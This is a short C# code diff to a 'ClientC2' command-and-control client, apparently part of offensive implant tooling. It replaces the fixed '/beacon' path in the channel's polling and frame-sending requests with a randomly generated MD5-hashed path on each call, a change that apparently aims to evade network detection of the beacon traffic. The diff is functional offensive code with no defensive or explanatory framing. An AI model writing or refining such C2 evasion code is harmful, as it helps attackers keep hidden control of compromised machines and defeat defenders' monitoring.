@@ -2,6 +2,7 @@
 using ClientC2.interfaces;
 using System.Collections.Generic;
 using System.Threading;
+using ClientC2.helpers;
 
 namespace ClientC2.channels
 {
@@ -64,7 +65,7 @@ namespace ClientC2.channels
             string b64str;
             while(true)
             {
-                b64str = _client.Get("/beacon", headers);
+                b64str = _client.Get(String.Format("/beacon/{0}", Helpers.GenerateMD5(Convert.ToString(Guid.NewGuid()))).ToLower(), headers);
                 if (!string.IsNullOrEmpty(b64str)) break;
                 Thread.Sleep(1000);
             }
@@ -74,7 +75,7 @@ namespace ClientC2.channels
 
         public void SendFrame(byte[] buffer)
         {
-            _client.Post("/beacon", Convert.ToBase64String(buffer), headers);
+            _client.Post(String.Format("/beacon/{0}", Helpers.GenerateMD5(Convert.ToString(Guid.NewGuid()))).ToLower(), Convert.ToBase64String(buffer), headers);
         }
 
         public bool ReadAndSendTo(IC2Channel c2)
